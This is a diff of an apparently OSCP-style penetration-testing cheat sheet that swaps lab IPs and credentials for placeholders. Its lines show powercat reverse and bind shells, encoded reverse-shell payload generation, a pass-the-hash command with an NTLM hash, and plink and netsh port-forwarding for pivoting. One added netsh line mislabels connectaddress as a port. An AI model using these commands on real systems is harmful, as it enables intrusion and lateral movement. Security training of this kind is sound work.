@@ -697,11 +697,11 @@ powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4
 Script: [powercat.ps1](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1).
 
 ```
-powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1              Send a file
-powercat -c 10.11.0.4 -p 443 -e cmd.exe                                   Send a reverse shell
-powercat -l -p 443 -e cmd.exe                                             Set up a bind shell; -l option to create a listener, -p to specify the listening port number, -e to have an application executed once connected
-powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1             Create a stand-alone payload
-powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1     Create an encoded stand-alone payload with powercat
+powercat -c <IP> -p <PORT> -i C:\<DIR>\powercat.ps1                     Send a file
+powercat -c <IP> -p <PORT> -e cmd.exe                                   Send a reverse shell
+powercat -l -p 443 -e cmd.exe                                           Set up a bind shell; -l option to create a listener, -p to specify the listening port number, -e to have an application executed once connected
+powercat -c <IP> -p <PORT> -e cmd.exe -g > reverseshell.ps1             Create a stand-alone payload
+powercat -c <IP> -p <PORT> -e cmd.exe -ge > encodedreverseshell.ps1     Create an encoded stand-alone payload with powercat
 ```
 
 **Load a remote PowerShell script using iex**
@@ -3280,7 +3280,7 @@ HTTP POST Attack
 #### Pass-the-Hash
 - See ["Pass the Hash Attack"](https://www.netwrix.com/pass_the_hash_attack_explained.html)
 - [pth-winexe](https://github.com/byt3bl33d3r/pth-toolkit)
-  - `pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd`
+  - `pth-winexe -U username%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //<IP> cmd`
     - `-U` specifying the user name and hash, along with the SMB share and the name of the command to execute
 
 
@@ -3321,26 +3321,19 @@ HTTP POST Attack
 ### <ins>Plix.exe</ins>
 
 The general format is: `plink.exe <user>@<kali> -R <kaliport>:<target-IP>:<target-port>`
-- An example: `plink.exe -ssh -l tidus -pw hasford -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`
-  - `-ssh` connect via SSH
-  - `10.11.0.4` to our machine
-  - `-l tidus` as the `tidus` user
-  - `-pw hasford` using the password `hasford`
-  - `-R` to create a remote port forward of `10.11.0.4:1234`
-  - `127.0.0.1:3306` to the MySQL port on the Windows target
 
-The first time plink connects to a host, it will attempt to cache the host key in the registry. For this reason, we should pipe the answer to the prompt with the `cmd.exe /c echo y` command. The final result will look like `cmd.exe /c echo y | plink.exe -ssh -l tidus -pw hasford -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`.
+The first time plink connects to a host, it will attempt to cache the host key in the registry. For this reason, we should pipe the answer to the prompt with the `cmd.exe /c echo y` command. The final result will look like `cmd.exe /c echo y | plink.exe <user>@<kali> -R <kaliport>:<target-IP>:<target-port>`.
 
 ### <ins>Netsh</ins>
 
 #### Local port forwarding
-`netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.227`
+`netsh interface portproxy add v4tov4 listenport=<target-port> listenaddress=<target-IP> connectport=<forward-port> connectaddress=<forward-port>`
 - use netsh (`interface`) context to `add` an IPv4-to-IPv4 (`v4tov4`) proxy (`portproxy`)
-- listening on `10.11.0.22` (`listenaddress=10.11.0.22`), port `4455` (`listenport=4455`)
-- that will forward to `192.168.1.227` (`connectaddress=192.168.1.227`), port `445` (`connectport=445`)
+- listening on `<target-IP>` (`listenaddress=target-IP`), port `<target-port>` (`listenport=<target-port>`)
+- that will forward to `<forward-IP>` (`connectaddress=<forward-IP>`), port `<forward-port>` (`connectport=<forward-port>`)
 
 #### allow inbound traffic on TCP port 4455
-`netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow`
+`netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=<IP> localport=<port> action=allow`
 
 
 ### <ins>HTTPTunnel-ing through Deep Packet Inspection</ins>
